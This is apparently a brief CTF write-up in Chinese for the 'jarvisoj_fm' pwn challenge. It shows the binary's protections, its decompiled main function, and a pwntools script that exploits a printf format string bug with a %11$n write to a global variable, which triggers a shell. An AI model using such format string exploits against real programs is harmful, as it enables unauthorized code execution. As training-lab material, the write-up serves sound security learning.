# jarvisoj_fm

## 保护

```bash
$ checksec --file=fm
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



## main函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[80]; // [esp+2Ch] [ebp-5Ch] BYREF
  unsigned int v5; // [esp+7Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  be_nice_to_people();
  memset(buf, 0, sizeof(buf));
  read(0, buf, 0x50u);
  printf(buf);
  printf("%d!\n", x);
  if ( x == 4 )
  {
    puts("running sh...");
    system("/bin/sh");
  }
  return 0;
}
```



## EXP

第一个printf由格式化字符串漏洞，需要多练习

经过测试为第11个参数，要写入x的地址处4长度（x_addr长度为4）

```python
from pwn import *

p=process('./fm')
x_addr=0x0804a02c
payload=p32(x_addr)+b'%11$n'
p.sendline(payload)

p.interactive()
```

